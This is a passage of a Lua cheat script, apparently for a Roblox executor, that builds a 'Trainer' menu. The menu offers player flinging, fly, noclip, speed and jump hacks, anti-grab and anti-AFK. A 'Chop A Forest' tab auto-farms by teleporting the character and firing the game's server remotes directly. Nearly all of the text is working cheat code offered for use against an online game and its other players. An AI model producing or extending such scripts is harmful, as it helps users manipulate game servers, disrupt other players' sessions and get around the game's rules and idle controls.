    Callback = function(v) state.flingPlayers = v; Log:info("flingPlayers = " .. tostring(v)) end,
})
MainTab:CreateSlider({
    Name = "Throw Strength", Range = {100, 2000}, Increment = 10, Suffix = "studs/s",
    CurrentValue = 245, Flag = "Strength",
    Callback = function(v) state.strength = v; Log:info("strength = " .. v) end,
})
MainTab:CreateToggle({
    Name = "Mega Fling (~100k)", CurrentValue = false, Flag = "MegaFling",
    Callback = function(v) state.megaFling = v; Log:info("megaFling = " .. tostring(v)) end,
})
MainTab:CreateSlider({
    Name = "Mega Distance", Range = {10000, 500000}, Increment = 5000, Suffix = "studs",
    CurrentValue = 100000, Flag = "MegaDistance",
    Callback = function(v) state.megaDistance = v; Log:info("megaDistance = " .. v) end,
})

MainTab:CreateSection("Vertical Boost")
MainTab:CreateToggle({
    Name = "Vertical Boost", CurrentValue = false, Flag = "VerticalBoost",
    Callback = function(v) state.verticalBoost = v; Log:info("verticalBoost = " .. tostring(v)) end,
})
MainTab:CreateSlider({
    Name = "Vertical Factor", Range = {10, 200}, Increment = 5, Suffix = "%",
    CurrentValue = 50, Flag = "VerticalFactor",
    Callback = function(v) state.verticalFactor = v / 100; Log:info("verticalFactor = " .. state.verticalFactor) end,
})

MainTab:CreateSection("Move Speed")
MainTab:CreateToggle({
    Name = "Move Speed", CurrentValue = false, Flag = "MoveSpeed",
    Callback = function(v) setMoveSpeed(v) end,
})
MainTab:CreateSlider({
    Name = "Walk Speed", Range = {16, 200}, Increment = 2, Suffix = "studs/s",
    CurrentValue = 60, Flag = "WalkSpeed",
    Callback = function(v) state.walkSpeed = v; Log:info("walkSpeed = " .. v) end,
})

MainTab:CreateSection("Fly")
MainTab:CreateToggle({
    Name = "Fly", CurrentValue = false, Flag = "Fly",
    Callback = function(v)
        state.fly = v; Log:info("fly = " .. tostring(v))
        if not v then stopFly() end
    end,
})
MainTab:CreateSlider({
    Name = "Fly Speed", Range = {20, 300}, Increment = 5, Suffix = "studs/s",
    CurrentValue = 60, Flag = "FlySpeed",
    Callback = function(v) state.flySpeed = v; Log:info("flySpeed = " .. v) end,
})
MainTab:CreateKeybind({
    Name = "Fly Toggle Key", CurrentKeybind = "F", HoldToInteract = false, Flag = "FlyKey",
    Callback = function(key)
        local ok2, ek = pcall(function() return Enum.KeyCode[key] end)
        if ok2 and ek then state.flyKey = ek; Log:info("flyKey = " .. key) end
    end,
})

MainTab:CreateSection("Anti-Grab (self-lock)")
MainTab:CreateToggle({
    Name = "Anti-Grab", CurrentValue = false, Flag = "AntiGrab",
    Callback = function(v)
        state.antiGrab = v; Log:info("antiGrab = " .. tostring(v))
        if v then enableAntiGrab() else disableAntiGrab() end
    end,
})
MainTab:CreateToggle({
    Name = "Sniff grab (debug)", CurrentValue = false, Flag = "SniffGrab",
    Callback = function(v)
        state.sniffGrab = v
        Log:info("sniffGrab = " .. tostring(v))
        if v then startSniff() else stopSniff() end
    end,
})

MainTab:CreateSection("Auto Farm")
MainTab:CreateButton({ Name = "Pick lever (5s)", Callback = function() startPickMode() end })
MainTab:CreateButton({ Name = "List saved levers", Callback = function() listSavedLevers() end })
MainTab:CreateButton({ Name = "Clear saved levers", Callback = function() clearSavedLevers() end })
MainTab:CreateButton({
    Name = "Trigger lever now",
    Callback = function()
        local n = 0
        for path, inst in pairs(savedLevers) do
            if inst and inst.Parent then
                if tryActivate(inst) then n = n + 1 end
            end
        end
        Log:info("manual trigger: " .. n .. " levers")
    end,
})
MainTab:CreateToggle({
    Name = "Auto Farm (saved levers)", CurrentValue = false, Flag = "AutoFarm",
    Callback = function(v)
        state.autoFarm = v
        Log:info("autoFarm = " .. tostring(v))
        if v then enableAutoFarm() else disableAutoFarm() end
    end,
})
MainTab:CreateSlider({
    Name = "Farm Cooldown", Range = {60, 1800}, Increment = 30, Suffix = "s",
    CurrentValue = 900, Flag = "FarmCooldown",
    Callback = function(v)
        state.farmCooldown = v
        Log:info("farmCooldown = " .. v .. "s (" .. (v / 60) .. " min)")
    end,
})

MainTab:CreateSection("Fast Escape")
MainTab:CreateToggle({
    Name = "Fast Escape", CurrentValue = false, Flag = "FastEscape",
    Callback = function(v)
        state.fastEscape = v
        Log:info("fastEscape = " .. tostring(v))
        if v then enableFastEscape() else disableFastEscape() end
    end,
})
MainTab:CreateSlider({
    Name = "Escape Time", Range = {1, 10}, Increment = 1, Suffix = "s",
    CurrentValue = 4, Flag = "EscapeTime",
    Callback = function(v) state.escapeTime = v; Log:info("escapeTime = " .. v .. "s") end,
})

-- ===================== UI: CHOP A FOREST =====================
local ChopTab = Window:CreateTab("Chop A Forest")
ChopTab:CreateSection("Auto Farm")

local chopState = {
    autoChop = false,
    autoCollect = false,
    autoSell = false,
    autoBuy = false,
    noclip = false,
    speed = false,
    speedValue = 60,
    jump = false,
    jumpValue = 100,
}

local ChopRemotes = game:GetService("ReplicatedStorage"):WaitForChild("Shared"):WaitForChild("Services"):WaitForChild("ChopRemotes")
local TreeChopRequest = game:GetService("ReplicatedStorage"):WaitForChild("TreeChopRequest", 5)

local function chopGetHRP()
    local char = LP.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function chopGetHumanoid()
    local char = LP.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function chopFindClosestIn(container, nameFilter, maxDist)
    local hrp = chopGetHRP()
    if not hrp or not container then return nil end
    local closest, closestDist = nil, maxDist or math.huge
    for _, obj in ipairs(container:GetDescendants()) do
        if obj:IsA("BasePart") then
            if not nameFilter or obj.Name:lower():find(nameFilter) then
                local dist = (hrp.Position - obj.Position).Magnitude
                if dist < closestDist then
                    closest, closestDist = obj, dist
                end
            end
        end
    end
    return closest, closestDist
end

task.spawn(function()
    while true do
        task.wait(0.6)
        if chopState.autoChop then
            local treeZone = workspace:FindFirstChild("TreeZone_Respawn")
                or workspace:FindFirstChild("ChopLocal")
            local hrp = chopGetHRP()
            if treeZone and hrp then
                local closest, closestDist = nil, math.huge
                for _, obj in ipairs(treeZone:GetChildren()) do
                    if obj:IsA("Model") and obj.Name == "TREE" then
                        local base = obj:FindFirstChildWhichIsA("BasePart") or obj.PrimaryPart
                        if base then
                            local dist = (hrp.Position - base.Position).Magnitude
                            if dist < closestDist then
                                closest, closestDist = obj, dist
                            end
                        end
                    end
                end
                if closest and closestDist < 30 then
                    if TreeChopRequest then
                        pcall(function()
                            TreeChopRequest:FireServer(closest)
                        end)
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.4)
        if chopState.autoCollect then
            local logs = workspace:FindFirstChild("Logs")
            local hrp = chopGetHRP()
            if logs and hrp then
                local wood = chopFindClosestIn(logs, nil, 50)
                if wood then
                    hrp.CFrame = wood.CFrame + Vector3.new(0, 3, 0)
                    pcall(function()
                        ChopRemotes.PickupLog:FireServer(wood)
                    end)
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(2)
        if chopState.autoSell then
            local hrp = chopGetHRP()
            if hrp then
                local sellSpot = workspace:FindFirstChild("Map")
                    and workspace.Map:FindFirstChild("SellSpot")
                local sellOutpost = nil
                local forestHuts = workspace:FindFirstChild("ForestHuts")
                if forestHuts then
                    for _, obj in ipairs(forestHuts:GetDescendants()) do
                        if obj.Name == "SellOutpost" then sellOutpost = obj; break end
                    end
                end
                local target = sellSpot or sellOutpost
                if target then
                    local base = target:FindFirstChildWhichIsA("BasePart")
                        or target.PrimaryPart
                    if base then
                        hrp.CFrame = base.CFrame + Vector3.new(0, 5, 0)
                        pcall(function()
                            ChopRemotes.DepositLogs:FireServer()
                            ChopRemotes.CollectCash:FireServer()
                        end)
                        Log:info("chop: sell at " .. target:GetFullName())
                    end
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(5)
        if chopState.autoBuy then
            local hrp = chopGetHRP()
            if hrp then
                local forestHuts = workspace:FindFirstChild("ForestHuts")
                local shop = nil
                if forestHuts then
                    local sawShack = forestHuts:FindFirstChild("SawShack")
                    if sawShack then shop = sawShack:FindFirstChild("Shop") end
                end
                if shop then
                    local base = shop:FindFirstChildWhichIsA("BasePart") or shop.PrimaryPart
                    if base then
                        hrp.CFrame = base.CFrame + Vector3.new(0, 5, 0)
                    end
                end
                pcall(function()
                    ChopRemotes.BuyUpgrade:FireServer()
                    ChopRemotes.BuyTool:FireServer()
                end)
                Log:info("chop: tried buy upgrade/tool")
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.2)
        local hum = chopGetHumanoid()
        local char = LP.Character
        if hum then
            if chopState.speed then hum.WalkSpeed = chopState.speedValue end
            if chopState.jump then
                hum.JumpPower = chopState.jumpValue
                hum.UseJumpPower = true
            end
        end
        if chopState.noclip and char then
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = false end
            end
        end
    end
end)

ChopTab:CreateToggle({
    Name = "Auto Chop", CurrentValue = false, Flag = "ChopAutoChop",
    Callback = function(v) chopState.autoChop = v; Log:info("chop autoChop = " .. tostring(v)) end,
})
ChopTab:CreateToggle({
    Name = "Auto Collect", CurrentValue = false, Flag = "ChopAutoCollect",
    Callback = function(v) chopState.autoCollect = v; Log:info("chop autoCollect = " .. tostring(v)) end,
})
ChopTab:CreateToggle({
    Name = "Auto Sell", CurrentValue = false, Flag = "ChopAutoSell",
    Callback = function(v) chopState.autoSell = v; Log:info("chop autoSell = " .. tostring(v)) end,
})
ChopTab:CreateToggle({
    Name = "Auto Buy (upgrade + tool)", CurrentValue = false, Flag = "ChopAutoBuy",
    Callback = function(v) chopState.autoBuy = v; Log:info("chop autoBuy = " .. tostring(v)) end,
})

ChopTab:CreateSection("Movement")
ChopTab:CreateToggle({
    Name = "Noclip", CurrentValue = false, Flag = "ChopNoclip",
    Callback = function(v)
        chopState.noclip = v
        local char = LP.Character
        if char and not v then
            for _, p in ipairs(char:GetDescendants()) do
                if p:IsA("BasePart") then p.CanCollide = true end
            end
        end
        Log:info("chop noclip = " .. tostring(v))
    end,
})
ChopTab:CreateToggle({
    Name = "Speed", CurrentValue = false, Flag = "ChopSpeed",
    Callback = function(v) chopState.speed = v; Log:info("chop speed = " .. tostring(v)) end,
})
ChopTab:CreateSlider({
    Name = "Speed Value", Range = {16, 200}, Increment = 2, Suffix = "studs/s",
    CurrentValue = 60, Flag = "ChopSpeedValue",
    Callback = function(v) chopState.speedValue = v; Log:info("chop speedValue = " .. v) end,
})
ChopTab:CreateToggle({
    Name = "Jump", CurrentValue = false, Flag = "ChopJump",
    Callback = function(v) chopState.jump = v; Log:info("chop jump = " .. tostring(v)) end,
})
ChopTab:CreateSlider({
    Name = "Jump Value", Range = {50, 300}, Increment = 10, Suffix = "power",
    CurrentValue = 100, Flag = "ChopJumpValue",
    Callback = function(v) chopState.jumpValue = v; Log:info("chop jumpValue = " .. v) end,
})

-- ===================== UI: PLAYERS =====================
PlayersTab = Window:CreateTab("Players")
PlayersTab:CreateSection("Teleport")
PlayersTab:CreateButton({ Name = "Refresh player list", Callback = function() refreshPlayers() end })

refreshPlayers()
task.spawn(function()
    while PlayersTab do
        task.wait(15)
        pcall(refreshPlayers)
    end
end)

PlayersTab:CreateSection("Session")
PlayersTab:CreateToggle({
    Name = "Anti-AFK", CurrentValue = false, Flag = "AntiAfk",
    Callback = function(v)
        state.antiAfk = v
        Log:info("antiAfk = " .. tostring(v))
        if v then enableAntiAfk() else disableAntiAfk() end
    end,
})
PlayersTab:CreateToggle({
    Name = "Auto-Rejoin", CurrentValue = false, Flag = "AutoRejoin",
    Callback = function(v)
        state.autoRejoin = v
        Log:info("autoRejoin = " .. tostring(v))
        if v then enableAutoRejoin() else disableAutoRejoin() end
    end,
})
PlayersTab:CreateButton({ Name = "Rejoin now", Callback = function() attemptRejoin() end })

-- ===================== UI: LOG =====================
local LogTab = Window:CreateTab("Log")
LogTab:CreateSection("Console")

local logBox = LogTab:CreateParagraph({ Title = "Last events", Content = "log will appear here" })

local function refreshLogParagraph()
    local tail = {}
    local n = math.min(#Log.lines, 20)
    for i = #Log.lines - n + 1, #Log.lines do
        table.insert(tail, Log.lines[i])
    end
    pcall(function() logBox:Set({ Content = table.concat(tail, "\n") }) end)
end

task.spawn(function()
    while Rayfield do
        refreshLogParagraph()
        task.wait(1)
    end
end)

LogTab:CreateButton({
    Name = "Copy log to clipboard",
    Callback = function()
        local text = Log:dump()
        local how
        if setclipboard then setclipboard(text); how = "setclipboard"
        elseif toclipboard then toclipboard(text); how = "toclipboard"
        elseif writefile then writefile("trainer_log.txt", text); how = "trainer_log.txt"
        end
        if how then Log:info("log copied via " .. how) else Log:warn("clipboard unavailable") end
    end,
})
LogTab:CreateButton({
    Name = "Clear log",
    Callback = function()
        Log.lines = {}
        refreshLogParagraph()
        print("[Trainer] log cleared")
    end,
})

-- ===================== UI: CONFIG =====================
local ConfigTab = Window:CreateTab("Config")
ConfigTab:CreateSection("Settings")
ConfigTab:CreateButton({ Name = "Destroy UI", Callback = function() Rayfield:Destroy() end })

Log:info("Trainer ready")
